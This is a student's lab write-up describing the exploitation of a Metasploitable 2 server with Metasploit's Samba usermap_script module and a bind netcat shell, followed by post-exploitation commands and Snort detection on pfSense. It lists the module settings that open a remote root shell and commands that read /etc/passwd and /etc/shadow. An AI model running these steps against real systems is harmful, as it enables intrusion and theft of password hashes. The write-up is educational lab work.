# Tools and System Analysis

`Metasploit Framework` (Kali)

The main exploit I used was the Samba exploit:

```bash
use exploit/multi/samba/usermap_script
```

This module exploits an old vulnerability in Samba (`CVE-2007-2447`) that allows an attacker to
run arbitrary commands. It was a good choice for my beginner lab because it’s simple and
doesn’t require authentication.

For the payload, I initially tried:

```bash
set payload cmd/unix/reverse
```

But I had issues with port binding and reverse shells, so I switched to:

```bash
set payload cmd/unix/bind_netcat
```

This bind shell worked better for my setup because it had Kali (the attacker) connect to
Metasploitable (the target). With a bind shell, the victim machine listens for a connection, and
the attacker connects to it. I also set the following options in `Metasploit`:

```bash
set RHOSTS 192.168.12.14
set RPORT 139
```

These told `Metasploit` the target’s IP address (Metasploitable), and the port Samba uses (139).
I did not set `LHOST` because the bind shell doesn’t need it — the victim listens, and the attacker
connects. When I ran:

```bash
run
```

`Metasploit` reported:

```
[*] Command shell session 1 opened (192.168.12.14:4444) at ...
```

To interact with the session, I used:

```bash
sessions -i 1
```

This dropped me into the shell on the Metasploitable machine. From there, I ran the following
commands:

```bash
id
whoami
uname -a
hostname
ifconfig
cat /etc/passwd
cat /etc/shadow
ls /home
netstat -antp
ps aux
exit
```

`id`
This command shows the current user’s ID (UID), group ID (GID), and groups. It helps confirm if
I have root (administrator) access, which I did.

`whoami`
This command tells the username I am logged in as. It confirmed that I was logged in as root,
which means I had full control over the system.

`uname -a`
This command displays system information, like the Linux kernel version and architecture. I
used it to identify what kind of system Metasploitable 2 was running, which could help in
choosing additional exploits.

`hostname`
This command shows the machine’s hostname. I used it to verify that I was on the correct
system, which was named `metasploitable`.

`ifconfig`
This command shows the network interfaces and IP addresses on the machine. I used it to
confirm the target’s IP address, which was `192.168.12.14`.

`cat /etc/passwd`
This command shows the list of user accounts on the system. It helps attackers find usernames
for future attacks, like brute-forcing passwords.

`cat /etc/shadow`
This command displays hashed passwords stored in the system (only accessible to root). I used
it to confirm that I could access password hashes, which could be cracked in a real attack.

`ls /home`
This command lists the contents of the `/home` directory, where user files are stored. It helped
me identify which users had home directories and what files they might have.

`netstat -antp`
This command lists active network connections, listening ports, and the programs using them. I
used it to see what services were running and what ports were open on the system.

`ps aux`
This command shows all running processes on the system. It’s useful for identifying services,
active users, or suspicious activity.

`exit`
This command closes the shell session and returns me to the `Metasploit` console in Kali.

After running the Samba exploit, I checked the `Snort` Alerts in the `pfSense` web interface. `Snort`
had detected and logged the attack attempts. This showed me that the IDS is useful for
identifying malicious traffic, like my exploit.

For this cybersecurity lab, I used several tools from `Kali Linux` that are commonly used in
penetration testing and ethical hacking. These tools helped me perform reconnaissance,
exploitation, and post-exploitation tasks in a simulated environment.

`Nmap`
`Nmap` is a network scanning tool used to discover hosts and services on a network. Although I
didn’t use it extensively in this lab, it’s an important tool for identifying open ports, services, and
potential targets for attacks. It’s often the first step in an attack, helping attackers map the
network.

`Netcat`
`Netcat` is a networking tool that can read and write data across network connections. I used
`Netcat` indirectly through `Metasploit`’s `bind_netcat` payload, which created a bind shell on
Metasploitable 2. `Netcat` is also used for port scanning, banner grabbing, and simple file
transfers.

`netstat`
`Netstat` is a network utility that shows active connections, listening ports, and associated
programs. I used `netstat -antp` on Metasploitable 2 after gaining access to see what
services were running and what ports were open.

`ps`
The `ps` command displays running processes on a system. I used `ps aux` to see what
processes were active on Metasploitable 2. This helped me understand what services and
applications were running, which could reveal additional vulnerabilities.

`Nikto`
`Nikto` is a web server vulnerability scanner included in `Kali Linux`. It is used to identify common
issues on web servers, such as outdated software versions, misconfigurations, or files that may
be left behind by developers. I used `Nikto` in this lab to scan the Metasploitable 2 web server
and look for potential security problems. The command I ran was:

```bash
nikto -h 192.168.12.14
```

`Snort`
`Snort` is an open-source intrusion detection and prevention system (IDS/IPS). It can monitor
network traffic in real time and alert administrators when it detects suspicious or malicious
activity. `Snort` uses a set of rules to analyze network packets and look for patterns that match
known attack signatures, such as port scans, exploit attempts, and malware communication.

In this lab, I installed `Snort` on the `pfSense` firewall and configured it to monitor
the `server_net (192.168.12.x)` network where Metasploitable 2 was located. `Snort` worked by
inspecting traffic between my attacker machine (`Kali Linux`) and the target machine
(`Metasploitable 2`). When I ran the Samba exploit, `Snort` detected the attack and logged an alert
in the `pfSense` web interface. This showed me how `Snort` can help identify and respond to
network threats by monitoring traffic at the firewall level.

IDS and IPS tools are essential in cyber defense because they provide visibility into what is
happening on a network. An `IDS` (Intrusion Detection System) monitors network traffic and
generates alerts when it detects suspicious patterns, while an `IPS` (Intrusion Prevention System)
goes a step further and can actively block malicious traffic. These tools help detect attacks
early, such as port scans, malware infections, or exploitation attempts, so that security teams
can respond before damage is done. Without `IDS/IPS`, attackers could exploit systems silently
without being detected.

This lab simulates a real-world security environment by creating a small network with a firewall
(`pfSense`), an `IDS/IPS` (`Snort`), a vulnerable server (`Metasploitable 2`), and an attacker machine
(`Kali Linux`). The lab taught me how an attack happens, how it is detected, and how network
segmentation and security tools work together to protect a system. It was a safe way to learn
how cyberattacks and defenses work in the real world.
